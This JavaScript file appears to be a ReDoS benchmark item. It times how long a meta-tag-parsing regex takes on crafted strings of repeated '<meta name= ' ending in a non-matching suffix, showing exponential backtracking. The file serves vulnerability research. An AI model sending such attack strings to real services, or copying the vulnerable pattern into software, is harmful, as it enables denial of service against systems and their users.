/* 1519
 * <meta[\s]+[^>]*?name[\s]?=[\s\"\']+(.*?)[\s\"\']+content[\s]?=[\s\"\']+(.*?)[\"\']+.*?>
 * EXPONENT
 * nums:3
 * EXPONENT AttackString:""+"<meta name= "*256+"! _1SLQ_2"
 */
var REGEX = /<meta[\s]+[^>]*?name[\s]?=[\s\"\']+(.*?)[\s\"\']+content[\s]?=[\s\"\']+(.*?)[\"\']+.*?>/
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = '' + '<meta name= '.repeat(i*1) + '! _1SLQ_2'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 1 + ": " + time_cost+" ms")
}